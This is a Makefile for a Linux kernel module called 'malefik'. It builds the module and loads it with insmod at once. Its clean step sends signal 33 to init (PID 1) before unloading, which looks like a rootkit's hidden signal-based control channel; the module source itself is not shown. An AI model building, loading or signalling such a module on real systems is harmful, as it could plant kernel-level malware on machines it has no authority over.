obj-m 		:= malefik.o
KERNEL_ROOT := /lib/modules/$(shell uname -r)/build
FINAL_DEST	:= /lib/modules/$(shell uname -r)/kernel/drivers/mlfk/
DEBUG		:= 0

modules:
	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) modules
	insmod malefik.ko

clean:
	kill -33 1
	rmmod malefik
	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) clean
